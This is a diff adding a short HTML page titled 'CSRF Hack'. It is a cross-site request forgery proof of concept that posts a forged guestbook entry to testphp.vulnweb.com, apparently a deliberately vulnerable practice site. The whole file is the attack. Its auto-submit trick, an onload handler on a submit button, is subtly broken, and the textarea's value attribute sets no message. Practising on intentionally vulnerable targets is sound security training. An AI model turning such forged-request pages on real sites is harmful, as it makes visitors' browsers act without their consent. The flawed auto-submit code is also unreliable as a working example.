@@ -1,0 +1,13 @@
+<html>
+<head></head>
+<body>
+<h3>CSRF Hack </h3>
+
+<form action="http://testphp.vulnweb.com/guestbook.php" method="post" name="faddentry" id="csrf">
+	<input type="hidden" name="name" value="test" >
+	<textarea name="text" rows="5" wrap="VIRTUAL" style="width:500px;" value="CSRF OK~"></textarea>
+	<br>
+	<input type="submit" name="submit" value="add message" onload =this.submit()>
+</form>
+</body>
+</html>
